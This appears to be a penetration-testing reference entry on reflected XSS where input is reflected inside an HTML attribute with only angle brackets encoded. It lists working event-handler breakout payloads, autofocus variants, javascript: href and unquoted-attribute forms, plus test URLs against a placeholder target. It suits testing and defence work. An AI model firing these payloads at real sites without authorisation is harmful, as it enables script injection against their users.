---
tags: xss, reflected, html-attribute, angle-brackets-encoded, encoded, attribute, tier2
category: xss
---

# Reflected XSS — HTML Attribute (Angle Brackets Encoded)

## Pattern

Input reflected inside an HTML attribute value.
The server HTML-encodes `<` and `>` but NOT `"` or `'`.

```html
GET /search?q=test
Response: <input value="test" name="q">
```

## Why naive payloads fail

```
Payload: "><script>alert(1)</script>
Server encodes: &gt;&lt;script&gt;alert(1)&lt;/script&gt;
Result:  <input value="&gt;&lt;script&gt;...">   <- NOT executed
```

## The correct approach: event handler injection

Since `<` and `>` are encoded but `"` is raw, break out of the attribute value
and inject an event handler into the same tag.

**No `<` or `>` required.**

```
Payload: " onmouseover="alert(1)
Result:  <input value="" onmouseover="alert(1)" name="q">
                                ^ EXECUTES on mouse hover
```

## Working payloads for double-quoted attributes

```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onmouseenter="alert(1)
" tabindex="1" onfocus="alert(1)
" oninput="alert(1)" value="a
```

## Working payloads for single-quoted attributes

```
' onmouseover='alert(1)'
' onfocus='alert(1)' autofocus='
' onmouseenter='alert(1)'
```

## Detection: what to look for

```
context    = html_attribute
quote_type = double | single
encoded    = ['<', '>']
raw_chars  = ['"']    <- KEY SIGNAL: " is not encoded
```

If `"` is in `raw_chars` -> event handler injection will work.

## Test URL format

```
https://target.com/search?q=" onmouseover="alert(1)
```

For autofocus (fires without interaction):
```
https://target.com/search?q=" autofocus onfocus="alert(1)
```

## Context-specific variations

### href / src attribute
```
Payload: javascript:alert(1)
Result:  <a href="javascript:alert(1)">   <- fires on click
```

### Unquoted attribute
```
Payload:  onmouseover=alert(1) x=
Result:  <input value= onmouseover=alert(1) x=>
```

